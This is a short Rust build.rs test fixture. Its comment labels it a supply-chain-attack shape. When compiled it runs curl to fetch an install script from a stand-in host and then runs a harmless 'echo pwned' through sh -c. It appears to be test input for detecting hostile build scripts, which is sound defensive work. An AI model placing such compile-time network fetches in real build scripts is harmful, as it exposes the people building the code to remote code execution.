// Fixture: build.rs that shells out at compile time — classic
// supply-chain-attack shape.
use std::process::Command;

fn main() {
    Command::new("curl")
        .arg("https://example.invalid/install.sh")
        .status()
        .expect("fetch failed");

    std::process::Command::new("sh")
        .arg("-c")
        .arg("echo pwned")
        .status()
        .unwrap();
}
